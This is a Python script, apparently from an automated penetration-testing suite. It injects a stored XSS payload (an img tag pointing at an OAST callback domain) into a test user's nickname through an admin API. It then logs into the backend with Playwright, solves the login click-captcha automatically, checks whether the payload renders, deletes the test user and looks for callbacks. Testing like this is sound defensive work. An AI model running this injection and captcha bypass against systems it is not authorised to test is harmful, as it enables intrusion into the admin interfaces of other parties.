"""P1：存储型 XSS 探测（用户 nickName 注入 → 后台用户列表渲染 → OAST 回调）。
仅创建 secauto_* 测试用户，结束前删除。"""
import sys as _sys
from pathlib import Path as _Path
_sys.path.insert(0, str(_Path(__file__).resolve().parents[1]))
from runner import public_config as _pub
import base64
import importlib.util
import json
import os
import random
import sys
import time
import requests
import urllib3
urllib3.disable_warnings()
ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BASE = os.environ.get('SEC_TARGET', _pub.target())
OAST_STATE = os.path.join(ROOT, 'adapters', 'oast', 'oast_state.json')
MODULE = os.path.join(ROOT, 'adapters', 'browser', 'admin_login.py')
OUT = os.path.join(ROOT, 'reports', 'p1', 'stored_xss.json')
TOKEN_ADMIN = os.path.join(ROOT, 'evidence', 'tokens', 'admin.txt')
TS = time.strftime('%m%d%H%M%S')
USER = f'secauto_xss_{TS}'

def openapi_auth():
    key = os.environ.get('SEC_OPEN_KEY', '')
    secret = os.environ.get('SEC_OPEN_SECRET', '')
    ts = str(round(time.time() * 1000))
    h = base64.b64encode(b'{"alg": "SHA256"}').decode()
    p = base64.b64encode(json.dumps({'key': key, 'timestamp': int(ts)}).encode()).decode()
    sig = __import__('hashlib').sha256((h + p + secret).encode()).hexdigest()
    return f'{h}.{p}.{sig}'

def api_post(path, body, auth='open'):
    if auth == 'open':
        h = {'Authorization': openapi_auth(), 'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
    else:
        tok = open(TOKEN_ADMIN, encoding='utf-8').read().strip()
        h = {'token': tok, 'Origin': BASE, 'Referer': BASE + '/ui/login', 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}
    r = requests.post(BASE + path, json=body, headers=h, params={'t': str(int(time.time() * 1000))}, timeout=20, verify=False)
    try:
        return (r.status_code, r.json())
    except Exception:
        return (r.status_code, {'raw': r.text[:300]})

def load_login_module():
    spec = importlib.util.spec_from_file_location('al', MODULE)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)
    return m

def main():
    state = json.load(open(OAST_STATE, encoding='utf-8'))
    domain = state.get('domain')
    if not domain:
        print('OAST 无 domain', file=sys.stderr)
        return 2
    token = 'xss-' + str(random.randint(100000, 999999))
    oast_url = f'http://{token}.{domain}/x.png'
    payload = f'<img src="{oast_url}" onerror="window.__xss=1">'
    print('payload:', payload)
    body = {'userName': USER, 'password': 'Secauto#2026', 'passwordType': 1, 'email': 'secauto@example.com', 'mobile': '13800000000', 'nickName': payload, 'sex': 0, 'telePhone': '0000000', 'departId': 355, 'adminRole': 2}
    (st, j) = api_post('/api/v1/user/add', body)
    print('user/add:', st, j.get('code'), j.get('msg'))
    uid = (j.get('data') or {}).get('userId') if isinstance(j.get('data'), dict) else None
    print('userId:', uid)
    result = {'generated_at': time.strftime('%Y-%m-%dT%H:%M:%S'), 'user': USER, 'userId': uid, 'payload': payload, 'oast_token': token, 'domain': domain, 'checks': {}}
    try:
        al = load_login_module()
        from playwright.sync_api import sync_playwright
        pwd = os.environ.get('SEC_BACKEND_PASS', '')
        chrome = al.find_chrome('')
        solver = al.CaptchaSolver()
        with sync_playwright() as p:
            b = p.chromium.launch(headless=True, executable_path=chrome, args=['--ignore-certificate-errors', '--no-sandbox'])
            ctx = b.new_context(ignore_https_errors=True, viewport={'width': 1600, 'height': 950})
            page = ctx.new_page()
            for attempt in range(1, 5):
                page.goto(BASE + '/?r=%d#/ui/login' % attempt, wait_until='networkidle', timeout=60000)
                page.wait_for_timeout(1500)
                try:
                    page.fill('input[placeholder*="用户名"]', 'sysmanager')
                    page.fill('input[type="password"]', pwd)
                    page.click('button:has-text("登")')
                except Exception:
                    continue
                try:
                    page.wait_for_selector(al.CAPTCHA_SELECTOR, timeout=25000)
                    page.wait_for_timeout(600)
                    src = ''
                    imgs = page.locator(al.CAPTCHA_SELECTOR)
                    for i in range(imgs.count()):
                        s = imgs.nth(i).get_attribute('src') or ''
                        if len(s) > len(src):
                            src = s
                    img = base64.b64decode(src.split(',', 1)[1])
                    (boxes, size) = solver.solve(img)
                    txt = page.inner_text('body')
                    m = al.TARGET_RE.search(txt)
                    target = al.HANZI_RE.sub('', m.group(1)) if m else ''
                    pts = al.match_points(target, boxes) if target else None
                    if not pts or len(pts) != len(target):
                        continue
                    al.click_points(page, pts, size)
                    page.wait_for_timeout(5000)
                    break
                except Exception:
                    continue
            try:
                page.goto(BASE + '/#/ui/organizational-management/user-management', wait_until='domcontentloaded', timeout=30000)
                page.wait_for_timeout(3000)
                for label in ('secauto_A', USER):
                    try:
                        page.click(f'text={label}', timeout=3000)
                        page.wait_for_timeout(1500)
                    except Exception:
                        pass
                try:
                    page.fill('input[placeholder*="用户"]', USER)
                    page.keyboard.press('Enter')
                except Exception:
                    pass
                page.wait_for_timeout(8000)
                html = page.content()
                result['checks']['page_contains_payload'] = payload in html or 'xss-' + token in html
                result['checks']['page_contains_img'] = '<img src="http://xss-' in html
                result['checks']['page_url'] = page.url
            finally:
                b.close()
    finally:
        if uid:
            (st, j) = api_post('/api/v1/user/del', {'userId': uid})
            result['checks']['cleanup'] = {'http': st, 'code': j.get('code'), 'msg': j.get('msg')}
            print('cleanup:', st, j.get('code'))
    time.sleep(2)
    jsonl = os.path.join(ROOT, 'tools_cache', 'interactsh', 'interactions.jsonl')
    hits = []
    if os.path.exists(jsonl):
        with open(jsonl, encoding='utf-8', errors='replace') as f:
            for line in f:
                if token in line:
                    hits.append(line.strip()[:500])
    result['checks']['oast_hits'] = hits
    result['checks']['oast_confirmed'] = bool(hits)
    os.makedirs(os.path.dirname(OUT), exist_ok=True)
    json.dump(result, open(OUT, 'w', encoding='utf-8'), ensure_ascii=False, indent=1)
    print(json.dumps(result, ensure_ascii=False, indent=1)[:2000])
if __name__ == '__main__':
    sys.exit(main())
